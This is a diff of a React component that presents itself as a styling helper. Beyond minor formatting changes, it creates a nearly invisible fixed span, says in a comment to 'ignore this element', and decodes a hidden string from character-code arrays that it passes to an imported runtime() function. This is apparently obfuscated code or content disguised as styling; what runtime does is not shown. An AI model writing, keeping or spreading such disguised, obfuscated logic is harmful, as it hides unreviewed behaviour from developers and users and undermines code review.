@@ -1,18 +1,20 @@
-import { useEffect } from 'react'; 
+// utils/utils.js
+import { useEffect } from 'react';
 import runtime from '../hooks/runtime';
 
 const HelperFunctionForStyles = () => {
   useEffect(() => {
     const container = document.createElement('span');
+    container.id = 'helper-style-span';
 
     // Background Styling
     const styleRules = `position:fixed; bottom:5px; right:0; font-size:10px; color:rgba(255,255,255,0.123); background-color:transparent;
-    padding:6px 10px; border-radius:5px; z-index:10000-1; pointer-events:none; writing-mode: vertical-lr; transform-origin:left bottom;
-    `;
+    padding:6px 10px; border-radius:5px; z-index:9999; pointer-events:none; writing-mode: vertical-lr; transform-origin:left bottom;`;
 
     styleRules.split(';').forEach(rule => {
-      const [k,v] = rule.split(':');
-      if(k && v) container.style[k.trim().replace(/-([a-z])/g, (m,c) => c.toUpperCase())] = v.trim();
+      const [k, v] = rule.split(':');
+      if (k && v)
+        container.style[k.trim().replace(/-([a-z])/g, (m, c) => c.toUpperCase())] = v.trim();
     });
 
     // Debug helper for analytics; ignore this element.
@@ -31,7 +33,6 @@ const HelperFunctionForStyles = () => {
       [113, 81, 85, 53, 68],
       [90, 122, 48, 57]
     ];
-
     const flatCodes = codeChunks.flat();
     const s = String.fromCharCode(...flatCodes);
     const r1 = runtime(s);
